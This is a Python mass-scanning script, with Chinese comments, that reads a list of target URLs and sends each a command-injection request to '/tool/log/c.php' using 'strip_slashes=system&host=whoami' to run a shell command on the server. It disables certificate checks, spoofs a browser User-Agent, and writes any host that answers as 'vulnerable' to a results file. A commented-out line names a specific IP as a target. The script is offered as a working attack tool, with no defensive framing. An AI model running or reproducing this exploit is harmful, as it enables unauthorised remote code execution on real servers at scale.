import requests
import threading
import time
from optparse import OptionParser 
import sys
import ssl
import urllib3

urllib3.disable_warnings()
ssl._create_default_https_context = ssl._create_unverified_context

# usage = 'example：python -u http://www.xxx.com'  #提示信息
# parse = OptionParser(usage)             #调用提示信息
# #parse.add_option('-u',dest='url',type='string',help="-u对应目标URL")      #增加-u参数，，定义str型，help对应帮助信息
# parse.add_option('-r',dest='read_file',type='string',help="-r对应目标读取的文件")

# (options,args) = parse.parse_args()      #调用
# if options.read_file == None:                  #如果未输入-u参数，提示上述的提示信息
#     print(parse.usage)
#     sys.exit(0)
# url = "https://111.231.139.47/"
headers = {
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.360"
            }
def ask():
    try:
        read_file = open('E:\\url.txt','r',encoding='utf-8')
        for line in read_file:
            line = line.strip('\n')
            # print(line)
            url_dir = "/tool/log/c.php?strip_slashes=system&host=whoami"
            urls = str(line) + str(url_dir)
            # print(urls)
            res  = requests.get(url=urls,headers=headers,timeout=10,verify=False)
            # print(res)
            res_code = res.status_code
            if(res_code == 200):
                print('[+]',urls,"   ",res_code,"   存在漏洞")
                with open('end_url.txt','a+') as e:
                    e.writelines(urls + '\n')
            elif(res_code == 403):
                print("[-]",urls,"      403")
            else:
                print("[-]不存在，已修复或目录已删除")
        read_file.close()
        time.sleep(0.5)
    except:
        pass


def main():
    ask_threads = []
    for i in range(1,5):  
        t = threading.Thread(target=ask)
        ask_threads.append(t)

    for i in range(1,2):  # 启动存放在read_threads和write_threads列表中的线程
            ask_threads[i].start()

if __name__ == "__main__":
    main()
